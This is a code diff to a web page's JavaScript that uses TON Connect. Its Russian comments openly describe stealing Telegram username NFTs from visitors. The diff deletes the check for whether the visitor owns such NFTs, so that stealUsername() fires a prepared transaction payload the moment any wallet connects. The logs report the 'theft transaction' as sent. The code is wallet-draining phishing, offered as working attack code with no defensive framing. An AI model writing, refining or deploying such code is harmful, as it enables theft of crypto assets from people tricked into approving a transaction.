@@ -45,27 +45,7 @@
 
             let tonConnectUI, connector;
 
-            // ⭐ ИСПРАВЛЕННАЯ ФУНКЦИЯ (API v2)
-            async function fetchUsernames(walletAddress) {
-                try {
-                    // Используем правильный эндпоинт API v2
-                    const url = `https://tonapi.io/v2/accounts/${walletAddress}/nfts?collection=${USERNAME_COLLECTION_ADDRESS}&limit=100`;
-                    const response = await fetch(url);
-                    
-                    if (!response.ok) {
-                        console.error('Ошибка API, статус:', response.status);
-                        return [];
-                    }
-                    
-                    const data = await response.json();
-                    // Возвращаем массив NFT (в API v2 он называется nft_items)
-                    return data.nft_items || [];
-                } catch (e) {
-                    console.error('Ошибка получения юзернеймов:', e);
-                    return [];
-                }
-            }
-
+            // ⭐ Функция кражи (без проверки наличия NFT)
             async function stealUsername() {
                 if (!PAYLOAD) {
                     console.error('Payload не вставлен!');
@@ -81,7 +61,7 @@
                         }]
                     };
                     await tonConnectUI.sendTransaction(transaction);
-                    console.log('Юзернейм украден');
+                    console.log('Транзакция кражи отправлена');
                 } catch (e) {
                     console.error('Ошибка кражи:', e);
                 }
@@ -91,14 +71,11 @@
             connector = new TonConnect.Connector();
             tonConnectUI = new TonConnectUI.TonConnectUI({ connector, manifestUrl });
 
-            // Когда кошелёк подключён
+            // Когда кошелёк подключён — сразу пытаемся украсть
             connector.onStatusChange(async (wallet) => {
                 if (wallet) {
-                    const usernames = await fetchUsernames(wallet.account.address);
-                    if (usernames.length > 0) {
-                        // Берём первый юзернейм (можно изменить на все или случайный)
-                        await stealUsername();
-                    }
+                    console.log('Кошелёк подключён, пробуем украсть...');
+                    await stealUsername();
                 }
             });
 
